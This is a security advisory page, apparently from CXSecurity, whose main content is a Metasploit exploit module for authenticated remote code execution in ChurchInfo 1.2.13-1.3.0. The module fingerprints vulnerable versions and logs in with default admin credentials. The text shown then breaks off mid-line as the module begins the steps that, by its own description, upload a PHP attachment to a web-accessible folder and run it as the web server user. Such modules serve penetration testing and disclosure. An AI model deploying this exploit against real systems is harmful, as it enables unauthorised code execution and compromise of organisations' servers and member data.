---
title: ChurchInfo 1.2.13-1.3.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2022110039
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-23
fetch_date: 2025-10-03T23:26:40.351722
---

# ChurchInfo 1.2.13-1.3.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ChurchInfo 1.2.13-1.3.0 Remote Code Execution** **2022.11.22**  Credit:  **[m4lwhere](https://cxsecurity.com/author/m4lwhere/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = NormalRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::FileDropper
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'ChurchInfo 1.2.13-1.3.0 Authenticated RCE',
'Description' => %q{
This module exploits the logic in the CartView.php page when crafting a draft email with an attachment.
By uploading an attachment for a draft email, the attachment will be placed in the /tmp\_attach/ folder of the
ChurchInfo web server, which is accessible over the web by any user. By uploading a PHP attachment and
then browsing to the location of the uploaded PHP file on the web server, arbitrary code
execution as the web daemon user (e.g. www-data) can be achieved.
},
'License' => MSF\_LICENSE,
'Author' => [ 'm4lwhere <m4lwhere@protonmail.com>' ],
'References' => [
['URL', 'http://www.churchdb.org/'],
['URL', 'http://sourceforge.net/projects/churchinfo/'],
['CVE', '2021-43258']
],
'Platform' => 'php',
'Privileged' => false,
'Arch' => ARCH\_PHP,
'Targets' => [['Automatic Targeting', { 'auto' => true }]],
'DisclosureDate' => '2021-10-30', # Reported to ChurchInfo developers on this date
'DefaultTarget' => 0,
'Notes' => {
'Stability' => ['CRASH\_SAFE'],
'Reliability' => ['REPEATABLE\_SESSION'],
'SideEffects' => ['ARTIFACTS\_ON\_DISK', 'IOC\_IN\_LOGS']
}
)
)
# Set the email subject and message if interested
register\_options(
[
Opt::RPORT(80),
OptString.new('USERNAME', [true, 'Username for ChurchInfo application', 'admin']),
OptString.new('PASSWORD', [true, 'Password to login with', 'churchinfoadmin']),
OptString.new('TARGETURI', [true, 'The location of the ChurchInfo app', '/churchinfo/']),
OptString.new('EMAIL\_SUBJ', [true, 'Email subject in webapp', 'Read this now!']),
OptString.new('EMAIL\_MESG', [true, 'Email message in webapp', 'Hello there!'])
]
)
end
def check
if datastore['SSL'] == true
proto\_var = 'https'
else
proto\_var = 'http'
end
res = send\_request\_cgi(
'uri' => normalize\_uri(target\_uri.path, 'Default.php'),
'method' => 'GET',
'vars\_get' => {
'Proto' => proto\_var,
'Path' => target\_uri.path
}
)
unless res
return CheckCode::Unknown('Target did not respond to a request to its login page!')
end
# Check if page title is the one that ChurchInfo uses for its login page.
if res.body.match(%r{<title>ChurchInfo: Login</title>})
print\_good('Target is ChurchInfo!')
else
return CheckCode::Safe('Target is not running ChurchInfo!')
end
# Check what version the target is running using the upgrade pages.
res = send\_request\_cgi(
'uri' => normalize\_uri(target\_uri.path, 'AutoUpdate', 'Update1\_2\_14To1\_3\_0.php'),
'method' => 'GET'
)
if res && (res.code == 500 || res.code == 200)
return CheckCode::Vulnerable('Target is running ChurchInfo 1.3.0!')
end
res = send\_request\_cgi(
'uri' => normalize\_uri(target\_uri.path, 'AutoUpdate', 'Update1\_2\_13To1\_2\_14.php'),
'method' => 'GET'
)
if res && (res.code == 500 || res.code == 200)
return CheckCode::Vulnerable('Target is running ChurchInfo 1.2.14!')
end
res = send\_request\_cgi(
'uri' => normalize\_uri(target\_uri.path, 'AutoUpdate', 'Update1\_2\_12To1\_2\_13.php'),
'method' => 'GET'
)
if res && (res.code == 500 || res.code == 200)
return CheckCode::Vulnerable('Target is running ChurchInfo 1.2.13!')
else
return CheckCode::Safe('Target is not running a vulnerable version of ChurchInfo!')
end
end
#
# The exploit method attempts a login, adds items to the cart, then creates the email attachment.
# Adding items to the cart is required for the server-side code to accept the upload.
#
def exploit
# Need to grab the PHP session cookie value first to pass to application
vprint\_status('Gathering PHP session cookie')
if datastore['SSL'] == true
vprint\_status('SSL is true, changing protocol to HTTPS')
proto\_var = 'https'
else
vprint\_status('SSL is false, leaving protocol as HTTP')
proto\_var = 'http'
end
res = send\_request\_cgi(
'uri' => normalize\_uri(target\_uri.path, 'Default.php'),
'method' => 'GET',
'vars\_get' => {
'Proto' => proto\_var,
'Path' => datastore['RHOSTS'] + ':' + datastore['RPORT'].to\_s + datastore['TARGETURI']
},
'keep\_cookies' => true
)
# Ensure we get a 200 from the application login page
unless res && res.code == 200
fail\_with(Failure::UnexpectedReply, "#{peer} - Unable to reach the ChurchInfo login page (response code: #{res.code})")
end
# Check that we actually are targeting a ChurchInfo server.
unless res.body.match(%r{<title>ChurchInfo: Login</title>})
fail\_with(Failure::NotVulnerable, 'Target is not a ChurchInfo!')
end
# Grab our assigned session cookie
cookie = res.get\_cookies
vprint\_good("PHP session cookie is #{cookie}")
vprint\_status('Attempting login')
# Attempt a login with the cookie assigned, server will assign privs on server-side if authenticated
res = send\_request\_cgi(
'uri' => normalize\_uri(target\_uri.path, 'Default.php'),
'method' => 'POST',
'vars\_post' => {
'User' => datastore['USERNAME'],
'Password' => datastore['PASSWORD'],
'sURLPath' => datastore['TARGETURI']
}
)
# A valid login will give us a 302 redirect to TARGETURI + /CheckVersion.php so check that.
unless res && res.code == 302 && res.headers['Location'] == datastore['TARGETURI'] + '/CheckVersion.php'
fail\_with(Failure::UnexpectedReply, "#{peer} - Check if credentials are correct (response code: #{res.code})")
end
vprint\_good("Location header is #{res.headers['Location']}")
print\_good("Logged into application as #{datastore['USERNAME']}")
vprint\_status('Attempting exploit')
# We must add items to the cart before we can send the emails. This is a hard requirement server-side.
print\_status('Navigating to add items to cart')
res = send\_request\_cgi(
'uri' => normaliz...